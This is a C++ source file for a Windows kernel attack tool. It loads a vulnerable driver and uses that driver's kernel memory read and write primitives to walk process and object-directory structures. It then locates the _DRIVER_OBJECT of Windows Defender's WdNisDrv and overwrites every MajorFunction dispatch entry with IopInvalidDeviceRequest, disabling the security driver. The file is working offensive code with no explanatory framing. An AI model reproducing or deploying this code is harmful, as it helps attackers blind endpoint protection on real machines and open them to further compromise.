#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <algorithm>
#include <vector>
#include "DrvOps.h"
#include "GetOffsets.h"

using namespace std;

#define NUM_HASH_BUCKETS 37

struct offsets {
    ULONG64 ActiveProcessLinks;
    ULONG64 UniqueProcessId;
    ULONG64 ObjectTable;
    ULONG64 PsInitialSystemProcess;
    DWORD64 ObHeaderCookie;
    DWORD64 IopInvalidDeviceRequest;
    ULONG64 ObpRootDirectoryObject;

    DWORD ODE_ChainLink;
    DWORD ODE_Object;
    DWORD OH_InfoMask;
    DWORD OH_Body;
    DWORD OHNI_Name;
    DWORD DO_DriverName;
    DWORD DO_MajorFunction;
} g_offsets = {};

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

struct KernelDriver {
    std::string Name;
    uintptr_t BaseAddress;
    uint32_t Size;
};

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) {
    if (drivers.empty()) {
        return 0;
    }

    for (const auto& drv : drivers) {
        std::string nameLower = drv.Name;
        std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

        if (nameLower.find("ntoskrnl.exe") != std::string::npos ||
            nameLower.find("ntkrnl") != std::string::npos) {
            return (DWORD64)drv.BaseAddress;
        }
    }

    return 0;
}


std::vector<KernelDriver> GetSortedKernelDrivers() {
    std::vector<KernelDriver> driverList;

    auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) return driverList;

    ULONG len = 0;
    const int SystemModuleInformation = 11;

    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

    std::vector<BYTE> buffer(len);
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
        buffer.data(),
        len,
        &len
    );

    if (status != 0) return driverList; // STATUS_SUCCESS = 0

    auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

    for (ULONG i = 0; i < mods->Count; i++) {
        SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

        KernelDriver drv;
        drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
        drv.Size = entry.ImageSize;

        const char* nameStart = reinterpret_cast<const char*>(entry.FullPathName) + entry.OffsetToFileName;
        drv.Name = std::string(nameStart);

        driverList.push_back(drv);
    }

    std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
        return a.BaseAddress < b.BaseAddress;
        });

    return driverList;
}

bool KReadUnicodeString(HANDLE drv, ULONG64 unicodeStringAddr, wstring& out) {
    USHORT length = 0;
    if (!ReadPrimitive(drv, &length, (LPVOID)(uintptr_t)unicodeStringAddr, sizeof(USHORT)))
        return false;

    ULONG64 buffer = 0;
    if (!ReadPrimitive(drv, &buffer, (LPVOID)(uintptr_t)(unicodeStringAddr + 0x08), sizeof(ULONG64)))
        return false;

    if (!buffer || !length || length > 1024)
        return false;

    USHORT charCount = length / sizeof(wchar_t);
    out.resize(charCount);

    if (!ReadPrimitive(drv, out.data(), (LPVOID)(uintptr_t)buffer, length))
        return false;

    return true;
}

bool IsKernelAddress(ULONG64 addr) {
    return addr >= 0xFFFF000000000000ULL;
}

ULONG64 GetNameInfoOffset(UCHAR infoMask) {
    static const UCHAR bits[] = { 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40 };
    static const ULONG sizes[] = { 0x20, 0x20, 0x10, 0x20, 0x10, 0x08, 0x10 };

    ULONG offset = 0;
    for (int i = 0; i < 7; i++) {
        if (infoMask & bits[i]) {
            offset += sizes[i];
            if (bits[i] == 0x02)
                return offset;
        }
    }
    return 0;
}

ULONG64 SearchDriverInDirectory(HANDLE drv, ULONG64 directory, const wstring& targetName) {
    for (int i = 0; i < NUM_HASH_BUCKETS; i++) {
        ULONG64 entry = 0;
        if (!ReadPrimitive(drv, &entry, (LPVOID)(uintptr_t)(directory + i * sizeof(ULONG64)), sizeof(ULONG64)))
            continue;

        while (entry && IsKernelAddress(entry)) {
            ULONG64 object = 0;
            ReadPrimitive(drv, &object, (LPVOID)(uintptr_t)(entry + g_offsets.ODE_Object), sizeof(ULONG64));

            if (object && IsKernelAddress(object)) {
                wstring driverName;
                if (KReadUnicodeString(drv, object + g_offsets.DO_DriverName, driverName)) {
                    printf("    driver: %ls\n", driverName.c_str());
                    if (_wcsicmp(driverName.c_str(), targetName.c_str()) == 0) {
                        printf("[+] Found _DRIVER_OBJECT at 0x%llX (%ls)\n", object, driverName.c_str());
                        return object;
                    }
                }
            }

            ULONG64 next = 0;
            ReadPrimitive(drv, &next, (LPVOID)(uintptr_t)(entry + g_offsets.ODE_ChainLink), sizeof(ULONG64));
            entry = next;
        }
    }

    printf("[-] Driver not found in \\Driver\\\n");
    return 0;
}


ULONG64 FindDriverObject(HANDLE drv, ULONG64 ntoskrnlBase, const wstring& targetName) {
    ULONG64 rootDirPtr = ntoskrnlBase + g_offsets.ObpRootDirectoryObject;

    ULONG64 rootDir = 0;
    if (!ReadPrimitive(drv, &rootDir, (LPVOID)(uintptr_t)rootDirPtr, sizeof(ULONG64))) {
        printf("[-] Failed to read ObpRootDirectoryObject\n");
        return 0;
    }

    printf("[*] ObpRootDirectoryObject: 0x%llX\n", rootDir);

    int totalEntries = 0;
    int namedEntries = 0;

    for (int i = 0; i < NUM_HASH_BUCKETS; i++) {
        ULONG64 bucketAddr = rootDir + i * sizeof(ULONG64);
        ULONG64 entry = 0;
        if (!ReadPrimitive(drv, &entry, (LPVOID)(uintptr_t)bucketAddr, sizeof(ULONG64))) {
            continue;
        }

        printf("[*] Bucket %d: entry=0x%llX\n", i, entry);

        while (entry && IsKernelAddress(entry)) {
            totalEntries++;

            ULONG64 object = 0;
            ReadPrimitive(drv, &object, (LPVOID)(uintptr_t)(entry + g_offsets.ODE_Object), sizeof(ULONG64));

            printf("    entry=0x%llX object=0x%llX\n", entry, object);

            if (object && IsKernelAddress(object)) {
                ULONG64 header = object - g_offsets.OH_Body;

                UCHAR infoMask = 0;
                ReadPrimitive(drv, &infoMask, (LPVOID)(uintptr_t)(header + g_offsets.OH_InfoMask), sizeof(UCHAR));

                printf("    header=0x%llX infoMask=0x%02X\n", header, infoMask);

                if (infoMask & 0x02) {
                    namedEntries++;
                    ULONG64 nameInfoOffset = GetNameInfoOffset(infoMask);
                    ULONG64 nameInfo = header - nameInfoOffset;

                    printf("    nameInfoOffset=0x%llX nameInfo=0x%llX\n", nameInfoOffset, nameInfo);

                    if (IsKernelAddress(nameInfo)) {
                        wstring objName;
                        if (KReadUnicodeString(drv, nameInfo + g_offsets.OHNI_Name, objName)) {
                            printf("    name: %ls\n", objName.c_str());
                            if (objName == L"Driver") {
                                printf("[*] Found \\Driver\\ directory at 0x%llX\n", object);
                                return SearchDriverInDirectory(drv, object, targetName);
                            }
                        }
                        else {
                            printf("    KReadUnicodeString failed\n");
                        }
                    }
                }
            }

            ULONG64 next = 0;
            ReadPrimitive(drv, &next, (LPVOID)(uintptr_t)(entry + g_offsets.ODE_ChainLink), sizeof(ULONG64));
            entry = next;
        }
    }

    printf("[-] \\Driver\\ not found. totalEntries=%d namedEntries=%d\n", totalEntries, namedEntries);
    return 0;
}

DWORD64 getEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, DWORD pid)
{
    if (ntoskrnlBase == 0)
    {
        std::cerr << "Failed to find ntoskrnl.exe base address." << std::endl;
        return 0;
    }

    DWORD64 initialSystemProcess = ntoskrnlBase + g_offsets.PsInitialSystemProcess;  // Get EPROCESS of the System process (PID 4)
    cout << "PsInitialSystemProcess address " << initialSystemProcess << endl;

    getchar();
    // Open Driver

    getchar();
    // Read Primitive to get EPROCESS structure from System Process
    DWORD64 systemEPROCESS = 0;
    BOOL readResult = ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)initialSystemProcess, sizeof(DWORD64));
    cout << "System EPROCESS: " << systemEPROCESS << endl;


    // Make sure that the EPROCESS is not from the PID 4 (System)
    DWORD systemPid = 0;
    BOOL readPIDSystemResult = ReadPrimitive(drv, &systemPid, (LPVOID)(uintptr_t)(systemEPROCESS + g_offsets.UniqueProcessId), sizeof(DWORD));
    cout << "System PID: " << systemPid << endl;
    if (systemPid == pid) {
        return systemEPROCESS; // If the target process is SYSTEM (PID 4) we already have it
    }

    // Walk through the whole list
    DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
    cout << "headList address :" << headList << endl;

    // Get first process
    DWORD64 firstProcess = 0;
    BOOL readFirstResult = ReadPrimitive(drv, &firstProcess, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));
    if (!readFirstResult) {
        cout << "Failed getting first process" << endl;
    }
    cout << "First Flink: " << firstProcess << endl;


    DWORD64 currentProcess = firstProcess;
    int counter = 0;
    getchar();
    cout << "Starting while " << endl;
    while (currentProcess != headList && counter < 5000) {
        counter++;

        DWORD64 eprocess = currentProcess - g_offsets.ActiveProcessLinks;
        cout << "Checking EPROCESS " << eprocess << endl;

        // Read PID
        DWORD currentPid = 0;
        BOOL readPIDResult = ReadPrimitive(drv, &currentPid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD));
        if (!readPIDResult) {
            cout << "Error getting current PID " << endl;
        }
        cout << "Current PID " << currentPid << endl;

        if (currentPid == pid) {
            cout << "Correct EPROCESS Found " << endl;
            return eprocess;
        }

        // Read next one
        DWORD64 nextProcess = 0;
        BOOL readNextResult = ReadPrimitive(drv, &nextProcess, (LPVOID)(uintptr_t)currentProcess, sizeof(DWORD64));
        if (!readNextResult) {
            cout << "Error getting next result " << endl;
        }

        currentProcess = nextProcess;
    }

    cout << "PID Not found after checking all processes " << endl;
    return 0;
}

int getPIDbyProcName(const string& procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnap, &pe32) != FALSE) {
        wstring wideProcName(procName.begin(), procName.end());
        do {
            if (_wcsicmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe32) != FALSE);
    }

    CloseHandle(hSnap);
    return pid;
}

BOOL EnableSeDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

int main() {
    cout << "Hello World!\n";

    // 1. Enable SeDebugPrivilege for the current process
    BOOL setPriv = EnableSeDebugPrivilege();

    // 2. Get offsets
    KernelOffsets off{};
    if (!ResolveKernelOffsets(off)) {
        printf("\n[-] Failed to resolve kernel offsets\n");
        return 1;
    }

    printf("\n[+] Offsets resolved\n");

    g_offsets.ObjectTable = off.ObjectTable;
    g_offsets.ActiveProcessLinks = off.ActiveProcessLinks;
    g_offsets.UniqueProcessId = off.UniqueProcessId;
    g_offsets.PsInitialSystemProcess = off.PsInitialSystemProcess;
    g_offsets.ObHeaderCookie = off.ObHeaderCookie;
    g_offsets.ObpRootDirectoryObject = off.ObpRootDirectoryObject;


    printf("ObjectTable: 0x%llX\n", (unsigned long long)g_offsets.ObjectTable);
    printf("ActiveProcessLinks: 0x%llX\n", (unsigned long long)g_offsets.ActiveProcessLinks);
    printf("UniqueProcessId: 0x%llX\n", (unsigned long long)g_offsets.UniqueProcessId);
    printf("PsInitialSystemProcess: 0x%llX\n", (unsigned long long)g_offsets.PsInitialSystemProcess);
    printf("ObHeaderCookie: 0x%llX\n", (unsigned long long)g_offsets.ObHeaderCookie);
    printf("ObHeaderCookie: 0x%llX\n", (unsigned long long)g_offsets.ObHeaderCookie);
    printf("ObpRootDirectoryObject: 0x%llX\n", (unsigned long long)g_offsets.ObpRootDirectoryObject);

    g_offsets.ODE_ChainLink = off.ODE_ChainLink;
    g_offsets.ODE_Object = off.ODE_Object;
    g_offsets.OH_InfoMask = off.OH_InfoMask;
    g_offsets.OH_Body = off.OH_Body;
    g_offsets.OHNI_Name = off.OHNI_Name;
    g_offsets.DO_DriverName = off.DO_DriverName;
    g_offsets.DO_MajorFunction = off.DO_MajorFunction;
    g_offsets.IopInvalidDeviceRequest = off.IopInvalidDeviceRequest;

    printf("ODE_ChainLink: 0x%X\n", g_offsets.ODE_ChainLink);
    printf("ODE_Object:    0x%X\n", g_offsets.ODE_Object);
    printf("OH_InfoMask:   0x%X\n", g_offsets.OH_InfoMask);
    printf("OH_Body:       0x%X\n", g_offsets.OH_Body);
    printf("OHNI_Name:     0x%X\n", g_offsets.OHNI_Name);
    printf("DO_DriverName: 0x%X\n", g_offsets.DO_DriverName);
    printf("IopInvalidDeviceRequest: 0x%llX\n", (unsigned long long)g_offsets.IopInvalidDeviceRequest);
    printf("MajorFunction: offset  0x%X\n", g_offsets.DO_MajorFunction);


    // 3. List all drivers
    vector<KernelDriver> drivers = GetSortedKernelDrivers();

    // 4. Get ntoskrnl.exe address
    DWORD64 ntoskrnlBase = GetNtoskrnlBase(drivers);
    cout << "NTOSKRNL Base address " << hex << ntoskrnlBase << endl;
    getchar();

    HANDLE drv = openVulnDriver();

    ULONG64 driverObj = FindDriverObject(drv, ntoskrnlBase, L"\\Driver\\WdNisDrv");
    if (driverObj) {
        printf("[+] _DRIVER_OBJECT: 0x%llX\n", driverObj);
    }

    ULONG64 iopInvalidAddr = ntoskrnlBase + g_offsets.IopInvalidDeviceRequest;
    for (int i = 0; i < 28; i++) {
        ULONG64 entry = driverObj + g_offsets.DO_MajorFunction + i * sizeof(ULONG64);
        WritePrimitive(drv, (LPVOID)(uintptr_t)entry, &iopInvalidAddr, sizeof(ULONG64));
    }

    return 0;
}

